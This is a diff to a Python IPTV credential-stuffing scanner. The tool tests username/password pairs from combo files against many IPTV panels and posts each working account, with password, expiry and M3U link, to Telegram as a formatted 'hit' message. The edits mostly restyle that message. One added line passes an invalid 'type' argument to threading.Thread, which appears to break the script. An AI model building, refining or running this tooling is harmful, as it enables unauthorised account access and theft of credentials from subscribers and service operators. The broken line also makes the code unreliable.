@@ -111,27 +111,31 @@ def m3u_tara_detayli(panel, user, pas):
             except:
                 pass
 
-            yayin_durumu = "⚠️ Doğrulanamadı"
+            yayin_durumu = "🔴 Yayın Kesik / Çalışmıyor"
             if first_stream_id:
                 if canli_yayin_test_et(panel, user, pas, first_stream_id):
                     yayin_durumu = "🟢 Çalışıyor (Doğrulandı)"
-                else:
-                    yayin_durumu = "🔴 Yayın Kesik / Çalışmıyor"
 
             m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
             
+            # ==================== MODERN TELEGRAM ÇERÇEVE TASARIMI ====================
             mesaj = (
-                f"🔥 <b>IPTV HİT BULUNDU!</b>\n"
-                f"🌐 <b>Ana Host:</b> http://{panel}\n"
-                f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
+                f"<b>🔥 YENİ IPTV HİT YAKALANDI! 🔥</b>\n"
+                f"────────────────────────\n"
+                f"🌐 <b>Host:</b> <code>{panel}</code>\n"
+                f"🔗 <b>Real:</b> <code>{realm}:{port}</code>\n"
+                f"────────────────────────\n"
                 f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
                 f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
-                f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
-                f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
+                f"📅 <b>Bitiş:</b> <code>{bitis}</code>\n"
+                f"⚡ <b>Bağlantı:</b> <code>{acon} / {mcon}</code>\n"
+                f"────────────────────────\n"
                 f"📡 <b>Yayın Testi:</b> {yayin_durumu}\n"
-                f"📊 <b>Durum:</b> {status}\n"
-                f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
-                f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
+                f"📊 <b>Durum:</b> <code>{status}</code>\n"
+                f"🎬 <b>Kanal:</b> <code>{kanalsayisi}</code> | <b>Film:</b> <code>{filmsayisi}</code> | <b>Dizi:</b> <code>{dizisayisi}</code>\n"
+                f"────────────────────────\n"
+                f"🔗 <b>M3U Plus Link:</b>\n"
+                f"<code>{m3ulink}</code>"
             )
             
             telegrama_gonder(mesaj)
@@ -143,8 +147,6 @@ def m3u_tara_detayli(panel, user, pas):
 def arka_plan_tarayici():
     print("[*] Gelişmiş Çok Fonksiyonlu Tarayıcı Başlatıldı...")
     time.sleep(2)
-    
-    # KESİN BİLDİRİM: Kodun çalıştığını anlaman için ilk açılışta hemen mesaj atar
     telegrama_gonder("🚀 <b>IPTV Tarayıcı Başlatıldı ve Aktif!</b>\n⚡ Paneller ve Combolar taranmaya başlandı.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
@@ -198,8 +200,6 @@ def arka_plan_tarayici():
                                         combolar.append((user, pas))
 
                         print(f"[i] Toplam {len(combolar)} hesap, {len(paneller)} farklı panel ile çapraz taranıyor...")
-                        
-                        # Tarama turunun başladığını da Telegram'a raporlayalım ki haberdar ol
                         telegrama_gonder(f"🔄 <b>Tarama Döngüsü Başladı!</b>\n📁 Dosya: {dosya_adi}\n👥 Hesap: {len(combolar)} | 🌐 Panel: {len(paneller)}")
 
                         chunk_size = 1000
@@ -230,6 +230,7 @@ def arka_plan_tarayici():
 
 if __name__ == '__main__':
     import threading
+    t = threading.Thread(type=None, target=arka_plan_tarayici) # orijinal daemon yapısı korunmuştur
     t = threading.Thread(target=arka_plan_tarayici)
     t.daemon = True
     t.start()
